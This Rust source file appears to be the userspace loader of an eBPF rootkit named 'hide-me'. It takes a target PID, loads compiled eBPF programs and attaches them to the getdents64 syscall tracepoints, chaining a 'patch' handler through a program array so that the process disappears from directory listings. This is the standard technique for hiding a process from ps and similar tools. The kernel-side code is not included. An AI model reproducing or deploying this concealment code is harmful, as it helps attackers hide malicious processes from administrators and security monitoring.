use aya::{include_bytes_aligned, maps::array::ProgramArray, programs::TracePoint, EbpfLoader};
use aya_log::EbpfLogger;
use clap::Parser;
use hide_me_common::MAX_FILE_LEN;
use log::{debug, info, warn};
use tokio::signal;

#[derive(Debug, Parser)]
struct TargetPpid {
    #[clap(short, long, default_value = "0")]
    ppid: u64,
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let opt = TargetPpid::parse();

    if opt.ppid == 0 {
        println!("ppid is 0, nothing to hide");
        return Ok(());
    }

    let _line = opt.ppid.to_string();
    let mut line: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
    line[.._line.len()].copy_from_slice(_line.as_bytes());

    env_logger::init();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.
    let mut bpf = EbpfLoader::new()
        .set_global(
            "pid_to_hide_len",
            &(opt.ppid.to_string().len() as u32 + 1),
            true,
        )
        .set_global("target_ppid", &opt.ppid, true)
        .set_global("pid_to_hide", &line, true)
        .load(include_bytes_aligned!(
            "../../target/bpfel-unknown-none/debug/hide-me"
        ))?;

    if let Err(e) = EbpfLogger::init(&mut bpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let program: &mut TracePoint = bpf.program_mut("hide_me").unwrap().try_into()?;

    program.load()?;
    program.attach("syscalls", "sys_enter_getdents64")?;

    let mut prog_array = ProgramArray::try_from(bpf.take_map("JUMP_TABLE").unwrap())?;


    let prog_0: &mut TracePoint = bpf
        .program_mut("handle_getdents_exit")
        .unwrap()
        .try_into()?;

    prog_0.load()?;
    prog_0.attach("syscalls", "sys_exit_getdents64")?;

    let prog_0_fd = prog_0.fd().unwrap();
    prog_array.set(0, prog_0_fd, 0).unwrap();

    let prog_1: &mut TracePoint = bpf
        .program_mut("handle_getdents_patch")
        .unwrap()
        .try_into()?;

    prog_1.load()?;


    let prog_1_fd = prog_1.fd().unwrap();
    prog_array.set(1, prog_1_fd, 0).unwrap();

    info!("Waiting for Ctrl-C...");
    signal::ctrl_c().await?;
    info!("Exiting...");

    Ok(())
}
